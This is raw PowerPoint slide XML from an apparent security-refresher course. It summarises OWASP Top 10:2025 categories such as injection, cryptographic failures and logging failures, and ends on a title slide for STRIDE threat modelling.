            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12BD8CBD-C3F3-61FC-BC5C-9AB079D85ED3}"/>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2.   Security Misconfiguration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Apps missing appropriate security hardening across any part of the application stack or improperly configured permissions on cloud services.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Unnecessary features, open ports, verbose errors — all open doors.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3586924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B3639-3243-06FC-F816-010131B55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B9027-34C8-97F8-06B3-BA324047DFD0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>A03:2025</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{33467DFC-DEEC-B960-752C-69FDE21CC9CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7222359" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>3.   Software Supply Chain Failures</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Devs do not carefully track the versions of all components that you use (both client-side and server-side). This includes components you directly use as well as nested (transitive) dependencies.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Software is vulnerable, unsupported, or out of date. This includes the OS, web/application server, database management system (DBMS), applications, APIs and all components, runtime environments, and libraries.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Users fail to scan for vulnerabilities regularly and subscribe to security bulletins related to the components you use.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="540317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5868-D2BC-5B25-7867-53FEFF226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AEDF9-5229-68B2-75BD-94E49AD2CE86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>A04:2025</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9735AF26-AC87-8C78-CF77-D8BDB90C097D}"/>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4.   Cryptographic Failures</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Are any old or weak cryptographic algorithms or protocols used either by default or in older code?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Are default crypto keys in use, are weak crypto keys generated, are keys re-used, or is proper key management and rotation missing?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Are crypto keys checked into source code repositories?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Is encryption not enforced, e.g., are any HTTP headers (browser) security directives or headers missing?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1339936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852E5-94C5-77D0-F336-FE73950FD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04AE1-77E5-B1F9-1A3E-21F5F72558C1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>A05:2025</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E14C4D21-1920-9E73-6823-6EE4EEC9B0DD}"/>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5.   Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>User-supplied data is not validated, filtered, or sanitized by the application.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Unsanitized</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t> data is used within object-relational mapping (ORM) search parameters to extract additional, sensitive records.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Potentially hostile data is directly used or concatenated.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17463421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FEC6F-ACEE-BE42-2EAE-0BB3E2C5E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82802-BFEB-17AA-7BC2-D5B473B7ABDD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>A06:2025</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C91C727F-A7D4-3305-356D-784011052D3E}"/>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6.   Insecure Design</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Three key parts of having a secure design are:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Gathering Requirements and Resource Management</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Creating a Secure Design</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Having a Secure Development Lifecycle</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1231015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1D0D1-501C-E9FE-595D-1038951D0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6C285-011A-7624-9791-0EC4A178432D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>A08:2025</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{71878421-1C8D-0D87-8870-F3FBCD16099D}"/>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8.   Software or Data Integrity Failures</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t> and infrastructure that does not protect against </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>invalid or untrusted</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t> code or data being treated as trusted and valid</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and content delivery networks (CDNs)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28525215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8C6F0-4840-1BC5-6883-55D8A8EC6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C85D9-2780-1792-5497-2B9A48A35BC2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>A09:2025</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{62BE2132-DE11-A611-3415-71066369B4F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7222359" cy="4290028"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>9.   Logging &amp; Alerting Failures</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Auditable events, such as logins, failed logins, and high-value transactions, are not logged or logged inconsistently (e.g. only logging successful logins, not failed attempts).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Warnings and errors generate no, inadequate, or unclear log messages.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>The integrity of logs is not properly protected from tampering.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>Logs of applications and APIs are not monitored for suspicious activity.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1967792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B9F29-0F34-22CF-9C08-76EF2F15C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78961-9779-389F-D5FE-BA5E50F8381A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>A10:2025</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD327811-DE8B-076C-6F8F-4E406FFCB977}"/>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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>10.   Mishandling of Exceptional Conditions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>When programs fail to prevent, detect, and respond to unusual and unpredictable situations, which leads to crashes, unexpected behavior, and sometimes vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>An app doesn’t prevent an unusual situation from happening</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>An app doesn’t identify the situation as it is happening</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
              </a:rPr>
              <a:t>An app responds poorly or not at all to the situation afterwards</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1642893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2E18-B595-B6D0-3D07-C50CC7E36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04B0D-77D6-7ADF-54E8-9EF0BEA096C1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1917941"/>
            <a:ext cx="10515600" cy="3020530"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Lesson 01 - Security Refresher</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Topic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 04 – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
              </a:rPr>
              <a:t>Threat Modelling – the STRIDE Framework &amp; STRIDE-lite for Web API's 1.2.5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2861508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DCEEB-5852-D773-E1D9-54B5D62F8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B95C1-C27F-CE0C-F756-1EF44E891252}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.1.4 - </a:t>
            </a:r>
            <a:r>
